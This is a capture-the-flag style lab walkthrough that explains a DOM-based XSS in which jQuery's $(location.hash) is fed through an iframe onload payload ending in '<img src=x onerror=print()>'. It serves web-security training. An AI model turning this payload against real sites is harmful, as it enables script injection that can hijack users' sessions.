## Solution steps

- Notice the vulnerable code on the home page using the browser's DevTools.
- From the lab banner, open the exploit server.
- In the Body section, add the following malicious iframe: `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
- Store the exploit, then click View exploit to confirm that the print() function is called.
- Go back to the exploit server and click Deliver to victim to solve the lab.

## Explanation
- Let’s say the vulnerable site is: https://victim-site.com/#some-value
- And the site has some JavaScript like this: $(location.hash)
- That line of code means: "Take whatever comes after the # in the URL, and pass it to jQuery's $() function."
- So if the URL is: `https://victim-site.com/#<img src=x onerror=print()>`
- Then the code becomes: `$('<img src=x onerror=print()>')`
- Which creates an image element and puts it on the page. And because the image source is invalid (x), it fails to load, which triggers the onerror=print() part and our XSS gets executed.
- You can't just send a link like this: `https://victim-site.com/#<img src=x onerror=print()>`. Because some browsers or filters might block or break the < > characters, especially in URLs.
- So instead, you load the vulnerable page in an <iframe> and dynamically change its src from JavaScript inside your exploit.
  <pre> <iframe src="https://victim-site.com/#" onload="this.src+='<img src=x onerror=print()>'"> </iframe> </pre>
- What this does:
  1. Loads the page like this:
  → `https://victim-site.com/#`
  2. Then the onload event triggers:
  → `this.src += <img src=x onerror=print()>`
  3. So the iframe reloads the page like:
  → `https://victim-site.com/#<img src=x onerror=print()>`
  4. That gets inserted into the page with jQuery:
  → `$(location.hash)`
  5. Which becomes:
  → `$('<img src=x onerror=print()>')`
  6. That creates a broken image and triggers:
  → `print()`
